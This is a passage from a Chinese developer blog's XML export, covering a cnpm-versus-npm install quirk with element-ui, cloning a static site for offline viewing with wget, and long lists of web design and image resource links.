    <content><![CDATA[<p>在一个 <code>Vue-Cli</code> 的项目中发现使用 <code>cnpm install</code>安装依赖库有些小问题，导致在WebStrom上无法识别库的<code>自定义标签</code>，也无法跳转到<code>自定义标签</code>的源码。</p>
<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cnpm install element-ui -S</span><br></pre></td></tr></table></figure>
<p>使用标签 <code>&lt;el-button/&gt;</code> 时，webstrom提示 <code>Unknown html tag el-button</code></p>
<p>查看 <code>node_modules</code> 目录，发现element-ui 有两个目录。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_element-ui@2.8.2@element-ui</span><br><span class="line">element-ui</span><br></pre></td></tr></table></figure>
<p>其中<code>element-ui</code>是<a href="mailto:`_element-ui@2.8.2" target="_blank" rel="noopener">`_element-ui@2.8.2</a>@element-ui`的引用（Windows下文件夹图标有个箭头）。</p>
<p>而用<code>npm install</code>安装时，就只有<code>element-ui</code>一个目录，WebStrom 可以识别到库的<code>自定义标签</code>，可以跳到<code>自定义标签</code>的源码。</p>
<h2 id="如何更正"><a href="#如何更正" class="headerlink" title="如何更正"></a>如何更正</h2><p>如果已经使用cnpm安装了软件库，那么如果改为npm呢？</p>
<ol>
<li>如果是一两个软件库，使用 <code>uninstall</code> 命令删掉，重新 <code>install</code> 一遍即可。</li>
<li>但比如的整个项目都是用 <code>cnpm install</code> ，直接把<code>node_modules</code>目录删掉，重新执行<code>npm install</code>命令即可。</li>
</ol>
<h2 id="网速慢的问题"><a href="#网速慢的问题" class="headerlink" title="网速慢的问题"></a>网速慢的问题</h2><p>参考<a href="../npm淘宝源">《npm淘宝源》</a> 对 <code>npm</code> 做配置。</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>网站设计欣赏</title>
    <url>/%E5%89%8D%E7%AB%AF/%E7%BD%91%E7%AB%99%E8%AE%BE%E8%AE%A1%E6%AC%A3%E8%B5%8F/</url>
    <content><![CDATA[<h2 id="站点"><a href="#站点" class="headerlink" title="站点"></a>站点</h2><ul>
<li><a href="http://www.iiimg.cn/" target="_blank" rel="noopener">全球酷站中心</a></li>
<li><a href="https://www.calltoidea.com/" target="_blank" rel="noopener">收集优秀UI组件元素站点</a></li>
<li><a href="https://freebiesbug.com" target="_blank" rel="noopener">高质量设计网站</a></li>
<li><a href="https://www.awwwards.com" target="_blank" rel="noopener">优秀的页面设计awwwards</a></li>
</ul>
<h2 id="模板站点"><a href="#模板站点" class="headerlink" title="模板站点"></a>模板站点</h2><p>国内搜索 <code>“网页模板”</code> 大多数是很旧很差的模板，到国外搜索 <code>“website templates free”</code> 或者再加上 <code>&quot;Bootstrap&quot;</code> 会找到相对优质一点的资源。</p>
<ol>
<li><a href="https://colorlib.com/wp/templates/page/1" target="_blank" rel="noopener">600+ 个免费的Bootstrap HTML 模板 1</a> </li>
<li><a href="https://colorlib.com/wp/cat/bootstrap/page/1/" target="_blank" rel="noopener">600+ 个免费的Bootstrap HTML 模板 2</a></li>
<li><a href="https://www.free-css.com/template-categories/bootstrap" target="_blank" rel="noopener">bootstrap 模板 free-css.com </a></li>
<li><a href="https://bootstrapmade.com" target="_blank" rel="noopener">bootstrap 模板 bootstrapmade.com</a></li>
</ol>
<h2 id="企业官网欣赏"><a href="#企业官网欣赏" class="headerlink" title="企业官网欣赏"></a>企业官网欣赏</h2><ol>
<li><p><a href="http://www.emqx.io" target="_blank" rel="noopener">emqx</a><br> emq的官网，设计的风格非常喜欢。</p>
</li>
<li><p><a href="https://electronjs.org/" target="_blank" rel="noopener">electron</a><br> electron的官网。</p>
</li>
<li><p><a href="http://www.neucloud.cn/#/" target="_blank" rel="noopener">neucloud</a><br> Vue写的企业网站，一般都认为Vue做企业网站对SEO不友好，但这个网站确实做的不错。</p>
</li>
<li><p><a href="https://laracasts.com/" target="_blank" rel="noopener">laracasts</a><br> PHP的Laravel框架效果很好的国外网站    </p>
</li>
<li><p><a href="https://www.laisitech.com" target="_blank" rel="noopener">laisitech</a><br> boostrap做的企业网站</p>
</li>
<li><p><a href="https://www.plex.tv" target="_blank" rel="noopener">plex.tv</a><br> 国外网站，设计很好</p>
</li>
<li><p><a href="https://www.teambition.com/" target="_blank" rel="noopener">teambition</a><br> 国内团队协作软件介绍网站，设计很好</p>
</li>
</ol>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>高清图库</title>
    <url>/%E5%89%8D%E7%AB%AF/%E9%AB%98%E6%B8%85%E5%9B%BE%E5%BA%93/</url>
    <content><![CDATA[<h2 id="pixabay"><a href="#pixabay" class="headerlink" title="pixabay"></a><a href="https://pixabay.com/" target="_blank" rel="noopener">pixabay</a></h2><h2 id="stocksnap"><a href="#stocksnap" class="headerlink" title="stocksnap"></a><a href="https://stocksnap.io/" target="_blank" rel="noopener">stocksnap</a></h2><h2 id="wallroom"><a href="#wallroom" class="headerlink" title="wallroom"></a><a href="https://wallroom.io/" target="_blank" rel="noopener">wallroom</a></h2><h2 id="网页背景照片查找"><a href="#网页背景照片查找" class="headerlink" title="网页背景照片查找"></a><a href="https://www.toptal.com/designers/subtlepatterns/" target="_blank" rel="noopener">网页背景照片查找</a></h2><p>##<a href="https://coolbackgrounds.io/" target="_blank" rel="noopener">网页背景图片生成</a></p>
<p><a href="http://nav.web-hub.cn/" target="_blank" rel="noopener">参考</a></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>静态网站克隆</title>
    <url>/%E5%89%8D%E7%AB%AF/%E9%9D%99%E6%80%81%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86/</url>
    <content><![CDATA[<p>静态网站克隆，就是将网站的 <code>html/css/js</code> 和图片等文件下载到本地，能离线浏览。</p>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>在 linux 上，我们经常用 wget 下载文件，加上参数 <code>-r -k</code> 等参数，可以将静态网站整个下载下来，但是 wget 是单线程下载，可能会比较慢。<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget -r -p -np -k http://localhost</span><br></pre></td></tr></table></figure></p>
<p>-r: 递归</p>
<p>-p: 下载图片等内容</p>
<p>-k: 转换链接</p>
<p>-np: 不追踪父级</p>
<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>在Windows下，可以使用 <code>WebZip</code> 这个软件来下载，这是一个很老的软件了，<a href="http://www.onlinedown.net/soft/19648.htm" target="_blank" rel="noopener">下载地址</a> ，基本上整个网站都能下载下来，但是它会加入 <code>WebZip</code> 的注释内容。</p>
<h2 id="预览效果"><a href="#预览效果" class="headerlink" title="预览效果"></a>预览效果</h2><p>再本地用Nginx、Apache等软件，将代码部署好就可以看到效果了，为了验证离线网站没有依赖网络的资源（如css等），可将本地网络断掉。</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>设计师资源</title>
    <url>/%E5%89%8D%E7%AB%AF/%E8%AE%BE%E8%AE%A1%E5%B8%88%E8%B5%84%E6%BA%90/</url>
    <content><![CDATA[<p>注意：<a href="https://github.com/jobbole/awesome-design-cn" target="_blank" rel="noopener">本文来自awesome，点击阅读原文</a></p>
<h3 id="ICON图标"><a href="#ICON图标" class="headerlink" title="ICON图标"></a>ICON图标</h3><ul>
<li><a href="http://hao.jobbole.com/fontello/" target="_blank" rel="noopener">Fontello</a>：图标字体生成器</li>
<li><a href="http://hao.jobbole.com/the-noun-project/" target="_blank" rel="noopener">The Noun Project</a>：免费提供高度可辨识符号图标</li>
<li><a href="http://hao.jobbole.com/iconarchive/" target="_blank" rel="noopener">IconArchive</a>：专业图标搜索引擎</li>
<li><a href="http://hao.jobbole.com/iconify/" target="_blank" rel="noopener">iConify</a>：Mac平台的苹果应用图标自动化生成工具</li>
<li><a href="http://hao.jobbole.com/iconbench/" target="_blank" rel="noopener">Iconbench</a>：在线ICON素材图标制作工具</li>
<li><a href="http://hao.jobbole.com/easyicon/" target="_blank" rel="noopener">EasyIcon</a>：免费图标搜索和下载平台</li>
<li><a href="http://hao.jobbole.com/icon-deposit/" target="_blank" rel="noopener">Icon Deposit</a>：一个奇妙的图标下载站</li>
</ul>
<h3 id="Logo-设计"><a href="#Logo-设计" class="headerlink" title="Logo 设计"></a>Logo 设计</h3><ul>
<li><a href="http://hao.jobbole.com/logaster/" target="_blank" rel="noopener">Logaster</a>：教你在线几分钟内搞定专业的LOGO设计</li>
<li><a href="http://hao.jobbole.com/logolounge/" target="_blank" rel="noopener">LogoLounge</a>：国际知名的LOGO设计权威网站</li>
<li><a href="http://hao.jobbole.com/logomoose/" target="_blank" rel="noopener">LogoMoose</a>：一个优秀的logo素材站点</li>
<li><a href="http://hao.jobbole.com/logopond/" target="_blank" rel="noopener">LogoPond</a>：LOGO设计作品收藏网</li>
<li><a href="http://hao.jobbole.com/brand-new/" target="_blank" rel="noopener">BRAND NEW</a>：资源丰富的Logo设计网站</li>
<li><a href="http://hao.jobbole.com/logoed/" target="_blank" rel="noopener">LOGOED</a>：一个展示Logo设计的博客</li>
<li><a href="http://hao.jobbole.com/logospire/" target="_blank" rel="noopener">LOGOSPIRE</a>：logo设计的交流平台</li>
<li><a href="http://hao.jobbole.com/logo-of-the-day/" target="_blank" rel="noopener">Logo of the Day</a>：汇集世界各地优秀LOGO作品的站点</li>
<li><a href="http://hao.jobbole.com/logodesignlove/" target="_blank" rel="noopener">LogoDesignLove</a>：Logo设计技巧分享网</li>
<li><a href="http://hao.jobbole.com/brandseen/" target="_blank" rel="noopener">Brandseen</a>：匹配流行品牌LOGO颜色的在线游戏</li>
</ul>
<h3 id="Photoshop插件"><a href="#Photoshop插件" class="headerlink" title="Photoshop插件"></a>Photoshop插件</h3><ul>
<li><a href="http://hao.jobbole.com/retinize/" target="_blank" rel="noopener">Retinize</a>：iOS切图神器</li>
<li><a href="http://hao.jobbole.com/guideguide/" target="_blank" rel="noopener">GuideGuide</a>：一款PS参考线插件</li>
<li><a href="http://hao.jobbole.com/divine-proportions-toolkit/" target="_blank" rel="noopener">Divine Proportions Toolkit</a>：黄金分割工具</li>
<li><a href="http://hao.jobbole.com/kockout/" target="_blank" rel="noopener">Kockout</a>：PS抠图神器</li>
<li><a href="http://hao.jobbole.com/coolors/" target="_blank" rel="noopener">Coolors</a>：自动生成配色色板的小工具</li>
<li><a href="http://hao.jobbole.com/assistor-ps/" target="_blank" rel="noopener">Assistor PS</a>：一个功能强大的PS辅助工具</li>
<li><a href="http://hao.jobbole.com/flexify-2/" target="_blank" rel="noopener">Flexify 2</a>：PS变形滤镜插件</li>
<li><a href="http://hao.jobbole.com/devrocket/" target="_blank" rel="noopener">DevRocket</a>：一款iOS UI设计效率工具</li>
<li><a href="http://hao.jobbole.com/slicy/" target="_blank" rel="noopener">Slicy</a>：Mac下的切图神器</li>
<li><a href="http://hao.jobbole.com/kuler/" target="_blank" rel="noopener">Kuler</a>：Adobe的配色工具</li>
</ul>
<h3 id="交互设计工具"><a href="#交互设计工具" class="headerlink" title="交互设计工具"></a>交互设计工具</h3><ul>
<li><a href="http://hao.jobbole.com/vxplo/" target="_blank" rel="noopener">VXPLO</a>：专业的HTML5编辑工具</li>
<li><a href="http://hao.jobbole.com/epub360/" target="_blank" rel="noopener">Epub360</a>：专业级H5交互设计工具</li>
<li><a href="http://hao.jobbole.com/indigo-studio/" target="_blank" rel="noopener">Indigo Studio</a>：UI原型设计和交互设计工具</li>
<li><a href="http://hao.jobbole.com/avocado/" target="_blank" rel="noopener">Avocado</a>：无需编码的跟设计原型进行交互</li>
<li><a href="http://hao.jobbole.com/webflow/" target="_blank" rel="noopener">Webflow</a>：傻瓜式网页设计制作平台</li>
<li><a href="http://hao.jobbole.com/marvel/" target="_blank" rel="noopener">Marvel</a>：更专注交互动作的在线工具</li>
<li><a href="http://hao.jobbole.com/principle/" target="_blank" rel="noopener">Principle</a>：Mac平台交互动效设计神器</li>
<li><a href="http://hao.jobbole.com/quartz-composer/" target="_blank" rel="noopener">Quartz Composer</a>：图形化的编程工具</li>
<li><a href="http://hao.jobbole.com/form/" target="_blank" rel="noopener">Form</a>：交互原型设计工具</li>
<li><a href="http://hao.jobbole.com/pixate/" target="_blank" rel="noopener">Pixate</a>：设计师的免费动效神器</li>
<li><a href="http://hao.jobbole.com/framer-js/" target="_blank" rel="noopener">Framer.js</a>：一个交互原型设计框架</li>
<li><a href="http://hao.jobbole.com/keynote/" target="_blank" rel="noopener">Keynote</a>：快速制作高保真交互原型</li>
<li><a href="http://hao.jobbole.com/origami/" target="_blank" rel="noopener">ORIGAMI</a>：交互神器-图像设计动画合成工具</li>
<li><a href="http://hao.jobbole.com/invision/" target="_blank" rel="noopener">InVision</a>：便捷的产品原型生成工具</li>
</ul>
<h3 id="流程图-脑图"><a href="#流程图-脑图" class="headerlink" title="流程图/脑图"></a>流程图/脑图</h3><ul>
<li><a href="http://hao.jobbole.com/processon/" target="_blank" rel="noopener">ProcessOn</a>：免费的在线作图、实时协作工具</li>
<li><a href="http://hao.jobbole.com/drawanywhere/" target="_blank" rel="noopener">DrawAnywhere</a>：在线流程图制作工具</li>
<li><a href="http://hao.jobbole.com/lovely-charts/" target="_blank" rel="noopener">Lovely Charts</a>：功能强大的在线图表制作工具</li>
<li><a href="http://hao.jobbole.com/creately/" target="_blank" rel="noopener">Creately</a>：优秀的绘制产品图形的在线工具</li>
<li><a href="http://hao.jobbole.com/cacoo/" target="_blank" rel="noopener">Cacoo</a>：在线简单易用的网络画图工具</li>
<li><a href="http://hao.jobbole.com/lucidchart/" target="_blank" rel="noopener">LucidChart</a>：在线流程图绘制和协作应用平台</li>
<li><a href="http://hao.jobbole.com/gliffy/" target="_blank" rel="noopener">Gliffy</a>：在线免费流程图制作工具</li>
<li><a href="http://hao.jobbole.com/novamind/" target="_blank" rel="noopener">NovaMind</a>：非常优秀的思维导图软件</li>
<li><a href="http://hao.jobbole.com/mindmapper/" target="_blank" rel="noopener">MindMapper</a>：专业的可视化脑图管理工具</li>
<li><a href="http://hao.jobbole.com/freemind/" target="_blank" rel="noopener">FreeMind</a>：免费的思维导图软件</li>
<li><a href="http://hao.jobbole.com/xmind/" target="_blank" rel="noopener">XMind</a>：非常实用的商业思维导图软件</li>
<li><a href="http://hao.jobbole.com/mindmanager/" target="_blank" rel="noopener">MindManager</a>：专业思维导图工具</li>
<li><a href="http://hao.jobbole.com/%e7%99%be%e5%ba%a6%e8%84%91%e5%9b%be/" target="_blank" rel="noopener">百度脑图</a>：便捷的思维编辑工具</li>
</ul>
<h3 id="灵感酷站"><a href="#灵感酷站" class="headerlink" title="灵感酷站"></a>灵感酷站</h3><ul>
<li><a href="http://hao.jobbole.com/sketchrepo/" target="_blank" rel="noopener">Sketchrepo</a>：免费高品质的Sketch资源</li>
<li><a href="http://hao.jobbole.com/psdrepo/" target="_blank" rel="noopener">Psdrepo</a>：免费高品质的PSD资源</li>
<li><a href="http://hao.jobbole.com/1x/" target="_blank" rel="noopener">1X</a>：一个优秀的摄影作品网站</li>
<li><a href="http://hao.jobbole.com/magdeleine/" target="_blank" rel="noopener">Magdeleine</a>：免费高清灵感图片网</li>
<li><a href="http://hao.jobbole.com/we-heart-it/" target="_blank" rel="noopener">We Heart It</a>：每天发现充满灵感且美丽的图片</li>
<li><a href="http://hao.jobbole.com/pinspire/" target="_blank" rel="noopener">PinSpire</a>：灵感创意作品收集平台</li>
<li><a href="http://hao.jobbole.com/notcot/" target="_blank" rel="noopener">NotCot</a>：一个集视觉效果、美学为一体的网站</li>
<li><a href="http://hao.jobbole.com/9gag/" target="_blank" rel="noopener">9GAG</a>：全球最搞笑的趣图网站</li>
<li><a href="http://hao.jobbole.com/booooooom/" target="_blank" rel="noopener">BoooooooM</a>：设计简约但内容丰富的博客</li>
<li><a href="http://hao.jobbole.com/illusion/" target="_blank" rel="noopener">illusion</a>：展示最惊人的创意图片</li>
<li><a href="http://hao.jobbole.com/baubauhaus/" target="_blank" rel="noopener">Baubauhaus</a>：提供设计灵感、插画摄影等艺术作品</li>
<li><a href="http://hao.jobbole.com/niice/" target="_blank" rel="noopener">Niice</a>：设计师必备的灵感搜索引擎</li>
<li><a href="http://hao.jobbole.com/deviantart/" target="_blank" rel="noopener">DeviantArt</a>：最大的艺术和设计社区</li>
<li><a href="http://hao.jobbole.com/%e8%8a%b1%e7%93%a3%e7%bd%91/" target="_blank" rel="noopener">花瓣网</a>：设计师寻找灵感的天堂</li>
<li><a href="http://hao.jobbole.com/pixiv/" target="_blank" rel="noopener">pixiv</a>：日本同人画、插画作品分享站点</li>
<li><a href="http://hao.jobbole.com/awwwards/" target="_blank" rel="noopener">Awwwards</a>：最佳网页设计展示平台</li>
<li><a href="http://hao.jobbole.com/wallhaven/" target="_blank" rel="noopener">WallHaven</a>：高清壁纸图片搜索引擎</li>
<li><a href="http://hao.jobbole.com/pinterest/" target="_blank" rel="noopener">Pinterest</a>：图片分享类的社交网站</li>
<li><a href="http://hao.jobbole.com/abduzeedo/" target="_blank" rel="noopener">Abduzeedo</a>：一家集创意灵感和教程的设计博客</li>
<li><a href="http://hao.jobbole.com/yanko-design/" target="_blank" rel="noopener">Yanko Design</a>：最棒的现代工业设计站点</li>
<li><a href="http://hao.jobbole.com/swissmiss/" target="_blank" rel="noopener">SwissMiss</a>：分享创意设计的网站</li>
<li><a href="http://hao.jobbole.com/petapixel/" target="_blank" rel="noopener">PetaPixel</a>：专业的摄影爱好者点评博客</li>
<li><a href="http://hao.jobbole.com/365psd/" target="_blank" rel="noopener">365PSD</a>：免费psd图片素材下载网站</li>
<li><a href="http://hao.jobbole.com/typophile/" target="_blank" rel="noopener">Typophile</a>：字体设计艺术网站</li>
<li><a href="http://hao.jobbole.com/patterntap/" target="_blank" rel="noopener">Patterntap</a>：适合用户界面设计和图案感兴趣的同学</li>
<li><a href="http://hao.jobbole.com/designshack/" target="_blank" rel="noopener">Designshack</a>：设计作品欣赏网站</li>
<li><a href="http://hao.jobbole.com/behance/" target="_blank" rel="noopener">Behance</a>：全球领先的专业创意平台</li>
<li><a href="http://hao.jobbole.com/dribbble/" target="_blank" rel="noopener">Dribbble</a>：设计师必备网站之一</li>
<li><a href="http://hao.jobbole.com/ffffound/" target="_blank" rel="noopener">FFFFound</a>：专业的图片收藏网</li>
<li><a href="http://hao.jobbole.com/mymodernmet/" target="_blank" rel="noopener">MyModernmet</a>：众多艺术家不可或缺的信息来源</li>
<li><a href="http://hao.jobbole.com/grain-edit/" target="_blank" rel="noopener">Grain Edit</a>：复古和古典风格的设计内容</li>
<li><a href="http://hao.jobbole.com/uiparade/" target="_blank" rel="noopener">UIparade</a>：灵感UI设计作品分享网站</li>
<li><a href="http://hao.jobbole.com/muuuuu/" target="_blank" rel="noopener">Muuuuu</a>：日本网站画廊，收集最具创意网站</li>
<li><a href="http://hao.jobbole.com/ikesai/" target="_blank" rel="noopener">iKesai</a>：网页设计作品案例库</li>
<li><a href="http://hao.jobbole.com/css-winner/" target="_blank" rel="noopener">CSS Winner</a>：网站设计资源站点</li>
</ul>
<h3 id="线框图-原型图"><a href="#线框图-原型图" class="headerlink" title="线框图/原型图"></a>线框图/原型图</h3><ul>
<li><a href="http://hao.jobbole.com/prott/" target="_blank" rel="noopener">Prott</a>：移动测试原型制作工具</li>
<li><a href="http://hao.jobbole.com/solidify/" target="_blank" rel="noopener">Solidify</a>：一款原型制作软件</li>
<li><a href="http://hao.jobbole.com/processon/" target="_blank" rel="noopener">ProcessOn</a>：免费的在线作图、实时协作工具</li>
<li><a href="http://hao.jobbole.com/mockingbird/" target="_blank" rel="noopener">Mockingbird</a>：一个基于 Web 的在线原型设计平台</li>
<li><a href="http://hao.jobbole.com/creately/" target="_blank" rel="noopener">Creately</a>：优秀的绘制产品图形的在线工具</li>
<li><a href="http://hao.jobbole.com/cacoo/" target="_blank" rel="noopener">Cacoo</a>：在线简单易用的网络画图工具</li>
<li><a href="http://hao.jobbole.com/gliffy/" target="_blank" rel="noopener">Gliffy</a>：在线免费流程图制作工具</li>
<li><a href="http://hao.jobbole.com/indigo-studio/" target="_blank" rel="noopener">Indigo Studio</a>：UI原型设计和交互设计工具</li>
<li><a href="http://hao.jobbole.com/%e5%a2%a8%e5%88%80mockingbot/" target="_blank" rel="noopener">墨刀MockingBot</a>：免费的移动应用原型与线框图工具</li>
<li><a href="http://hao.jobbole.com/marvel/" target="_blank" rel="noopener">Marvel</a>：更专注交互动作的在线工具</li>
<li><a href="http://hao.jobbole.com/keynote/" target="_blank" rel="noopener">Keynote</a>：快速制作高保真交互原型</li>
<li><a href="http://hao.jobbole.com/omnigraffle-2/" target="_blank" rel="noopener">OmniGraffle</a>：Mac平台下最好的原型设计工具</li>
<li><a href="http://hao.jobbole.com/handmade-sketches/" target="_blank" rel="noopener">Handmade Sketches</a>：手工草图绘制工具</li>
<li><a href="http://hao.jobbole.com/mockups-me/" target="_blank" rel="noopener">Mockups.me</a>：ui线框图软件</li>
<li><a href="http://hao.jobbole.com/live-wire/" target="_blank" rel="noopener">Live wire</a>：iPad上的线框图制作工具</li>
<li><a href="http://hao.jobbole.com/uxtoolbox/" target="_blank" rel="noopener">UXToolbox</a>：Window平台的线框图工具</li>
<li><a href="http://hao.jobbole.com/devrocket/" target="_blank" rel="noopener">DevRocket</a>：一款iOS UI设计效率工具</li>
<li><a href="http://hao.jobbole.com/appcooker/" target="_blank" rel="noopener">AppCooker</a>：从图标草图到原型设计的iPad应用</li>
<li><a href="http://hao.jobbole.com/blueprint/" target="_blank" rel="noopener">Blueprint</a>：你轻而易举地设计原型的iPad应用</li>
<li><a href="http://hao.jobbole.com/mockplus%e6%91%a9%e5%ae%a2/" target="_blank" rel="noopener">Mockplus摩客</a>：简洁高效的原型图设计工具</li>
<li><a href="http://hao.jobbole.com/pencil-project/" target="_blank" rel="noopener">Pencil Project</a>：制作图表和GUI原型的工具</li>
<li><a href="http://hao.jobbole.com/iplotz/" target="_blank" rel="noopener">iPlotz</a>：用来创建可点击、可导航的原型和线框图工具</li>
<li><a href="http://hao.jobbole.com/mokk-me/" target="_blank" rel="noopener">Mokk.me</a>：一个简单快速的原型工具</li>
<li><a href="http://hao.jobbole.com/invision/" target="_blank" rel="noopener">InVision</a>：便捷的产品原型生成工具</li>
<li><a href="http://hao.jobbole.com/hotgloo/" target="_blank" rel="noopener">HotGloo</a>：功能强大的产品原型在线工具</li>
<li><a href="http://hao.jobbole.com/iphone-mockup/" target="_blank" rel="noopener">iPhone Mockup</a>：非常简单的在线原型工具</li>
<li><a href="http://hao.jobbole.com/flairbuilder/" target="_blank" rel="noopener">FlairBuilder</a>：用来创建交互性线框图的快速原型工具</li>
<li><a href="http://hao.jobbole.com/pidoco/" target="_blank" rel="noopener">Pidoco</a>：一款基于Web的原型设计软件</li>
<li><a href="http://hao.jobbole.com/omnigraffle/" target="_blank" rel="noopener">Omnigraffle</a>：用来快速绘制线框图、图表、流程图等</li>
<li><a href="http://hao.jobbole.com/wireframesketcher/" target="_blank" rel="noopener">WireframeSketcher</a>：灵活的线框图和原型快速创作工具</li>
<li><a href="http://hao.jobbole.com/protoshare/" target="_blank" rel="noopener">Protoshare</a>：十分便捷的在线原型制作工具</li>
<li><a href="http://hao.jobbole.com/mockflow/" target="_blank" rel="noopener">MockFlow</a>：制作产品原型的在线工具</li>
<li><a href="http://hao.jobbole.com/balsamiq-mockups/" target="_blank" rel="noopener">Balsamiq Mockups</a>：基于Flash的快速制作线框图工具</li>
<li><a href="http://hao.jobbole.com/proto-io/" target="_blank" rel="noopener">Proto.io</a>：一个专用的手机原型开发平台</li>
<li><a href="http://hao.jobbole.com/axure-rp/" target="_blank" rel="noopener">Axure RP</a>：专业的快速原型设计工具</li>
<li><a href="http://hao.jobbole.com/wireframe-cc/" target="_blank" rel="noopener">Wireframe.cc</a>：在线线框图绘制工具</li>
<li><a href="http://hao.jobbole.com/powermockup/" target="_blank" rel="noopener">PowerMockup </a>：把微软的PPT文件直接变成线框图工具</li>
<li><a href="http://hao.jobbole.com/uxpin/" target="_blank" rel="noopener">UXPin</a>：实体模型和在线可点击原型创作工具</li>
<li><a href="http://hao.jobbole.com/fluid-ui/" target="_blank" rel="noopener">Fluid UI</a>：用于移动开发的Web原型设计工具</li>
<li><a href="http://hao.jobbole.com/moqups/" target="_blank" rel="noopener">Mockup</a>：在线线框图工具</li>
<li><a href="http://hao.jobbole.com/justinmind/" target="_blank" rel="noopener">justinmind</a>：产品原型设计工具</li>
</ul>
<h3 id="设计博客"><a href="#设计博客" class="headerlink" title="设计博客"></a>设计博客</h3><ul>
<li><a href="http://hao.jobbole.com/booooooom/" target="_blank" rel="noopener">BoooooooM</a>：设计简约但内容丰富的博客</li>
<li><a href="http://hao.jobbole.com/logoed/" target="_blank" rel="noopener">LOGOED</a>：一个展示Logo设计的博客</li>
<li><a href="http://hao.jobbole.com/abduzeedo/" target="_blank" rel="noopener">Abduzeedo</a>：一家集创意灵感和教程的设计博客</li>
<li><a href="http://hao.jobbole.com/swissmiss/" target="_blank" rel="noopener">SwissMiss</a>：分享创意设计的网站</li>
<li><a href="http://hao.jobbole.com/the-industry/" target="_blank" rel="noopener">The Industry</a>：学习平面设计的极佳出版物</li>
<li><a href="http://hao.jobbole.com/net-magazine/" target="_blank" rel="noopener">Net Magazine</a>：文章覆盖面广，适合扩宽眼界</li>
<li><a href="http://hao.jobbole.com/web-designer-depot/" target="_blank" rel="noopener">Web Designer Depot</a>：适合视觉设计人员专注</li>
<li><a href="http://hao.jobbole.com/design-modo/" target="_blank" rel="noopener">Design Modo</a>：偏于设计前沿和设计趋势的博客</li>
<li><a href="http://hao.jobbole.com/lukew/" target="_blank" rel="noopener">Lukew</a>：干货文章分享，资深的用户体验专家</li>
<li><a href="http://hao.jobbole.com/ux-magazine/" target="_blank" rel="noopener">UX Magazine</a>：善于用通俗的案例讲解理论知识</li>
<li><a href="http://hao.jobbole.com/uxbooth/" target="_blank" rel="noopener">UXbooth</a>：专注于用户体验设计文章</li>
<li><a href="http://hao.jobbole.com/smashing-magazine/" target="_blank" rel="noopener">Smashing Magazine</a>：整体质量很高的设计文章</li>
<li><a href="http://hao.jobbole.com/the-great-discontent/" target="_blank" rel="noopener">The Great Discontent</a>：提供世界顶尖创意者的漫长访谈</li>
</ul>
<h3 id="设计工具"><a href="#设计工具" class="headerlink" title="设计工具"></a>设计工具</h3><ul>
<li><a href="http://hao.jobbole.com/one-css-grid/" target="_blank" rel="noopener">One% CSS Grid</a>：一款基于百分比的CSS响应式框架</li>
<li><a href="http://hao.jobbole.com/simple-grid/" target="_blank" rel="noopener">Simple Grid</a>：轻量级的响应式 CSS 网格系统</li>
<li><a href="http://hao.jobbole.com/iconify-2/" target="_blank" rel="noopener">Iconify</a>：一个作品网站平台</li>
<li><a href="http://hao.jobbole.com/iconify/" target="_blank" rel="noopener">iConify</a>：Mac平台的苹果应用图标自动化生成工具</li>
<li><a href="http://hao.jobbole.com/viewport-resizer/" target="_blank" rel="noopener">Viewport Resizer</a>：一个测试响应式设计的小书签</li>
<li><a href="http://hao.jobbole.com/divshot/" target="_blank" rel="noopener">Divshot</a>：在线的可视化网页设计工具</li>
<li><a href="http://hao.jobbole.com/bootply/" target="_blank" rel="noopener">Bootply</a>：一款很棒的 Bootstrap UI 编辑工具</li>
<li><a href="http://hao.jobbole.com/jetstrap/" target="_blank" rel="noopener">Jetstrap</a>：Bootstrap框架的可视化制作工具</li>
<li><a href="http://hao.jobbole.com/layoutit/" target="_blank" rel="noopener">Layoutit</a>：在线搭建Bootstrap响应式布局的工具</li>
<li><a href="http://hao.jobbole.com/bonsai-2/" target="_blank" rel="noopener">Bonsai</a>：一套轻量级的JavaScript绘图库</li>
<li><a href="http://hao.jobbole.com/bootsnipp/" target="_blank" rel="noopener">Bootsnipp</a>：针对Web设计师和开发者的前端元素库</li>
<li><a href="http://hao.jobbole.com/simplytestable/" target="_blank" rel="noopener">SimplyTestable</a>：一款自动的前端网页测试工具</li>
<li><a href="http://hao.jobbole.com/onlytasks/" target="_blank" rel="noopener">Onlytasks</a>：支持双向同步的Evernote效率工具</li>
<li><a href="http://hao.jobbole.com/rwdgrid/" target="_blank" rel="noopener">rwdgrid</a>：基于960grid的响应式网格系统</li>
<li><a href="http://hao.jobbole.com/iconbench/" target="_blank" rel="noopener">Iconbench</a>：在线ICON素材图标制作工具</li>
<li><a href="http://hao.jobbole.com/photo-raster/" target="_blank" rel="noopener">Photo Raster</a>：在线免费图片编辑美化工具</li>
<li><a href="http://hao.jobbole.com/manymo/" target="_blank" rel="noopener">Manymo</a>：在线安卓系统模拟器工具</li>
<li><a href="http://hao.jobbole.com/sellbox/" target="_blank" rel="noopener">Sellbox</a>：可以通过Dropbox账户售卖你的数字文档</li>
<li><a href="http://hao.jobbole.com/rightfont/" target="_blank" rel="noopener">RightFont</a>：超好用的字体管理工具</li>
<li><a href="http://hao.jobbole.com/wobzip/" target="_blank" rel="noopener">Wobzip</a>：提供在线解压缩文件的网站</li>
<li><a href="http://hao.jobbole.com/archive-today/" target="_blank" rel="noopener">Archive.Today</a>：一个网页快照捕捉工具</li>
<li><a href="http://hao.jobbole.com/minigrid/" target="_blank" rel="noopener">Minigrid</a>：简约漂亮的网页布局栅格系统</li>
<li><a href="http://hao.jobbole.com/background-burner/" target="_blank" rel="noopener">Background Burner</a>：简单的在线抠图工具</li>
<li><a href="http://hao.jobbole.com/cloudconvert/" target="_blank" rel="noopener">CloudConvert</a>：在线免费的万能文件格式转换器</li>
